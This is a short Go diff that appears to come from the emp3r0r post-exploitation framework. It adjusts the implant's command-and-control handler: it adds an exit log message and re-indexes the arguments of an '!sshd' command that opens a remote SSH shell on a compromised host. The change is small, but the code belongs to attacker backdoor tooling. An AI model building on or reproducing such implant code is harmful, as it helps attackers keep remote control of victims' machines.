@@ -89,6 +89,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		if err != nil {
 			log.Fatalf("Failed to cleanup files")
 		}
+		log.Println("Exiting")
 		os.Exit(0)
 
 		/*
@@ -304,15 +305,15 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		// sshd server
 		// !sshd id shell port args
 		log.Printf("Got sshd request: %s", cmdSlice)
-		if len(cmdSlice) < 5 {
+		if len(cmdSlice) < 3 {
 			log.Printf("args error: %s", cmdSlice)
 			out = fmt.Sprintf("args error: %s", cmdSlice)
 			sendResponse(out)
 			return
 		}
-		shell := cmdSlice[2]
-		port := cmdSlice[3]
-		args := cmdSlice[4:]
+		shell := cmdSlice[1]
+		port := cmdSlice[2]
+		args := cmdSlice[3:]
 		go func() {
 			err = SSHD(shell, port, args)
 			if err != nil {
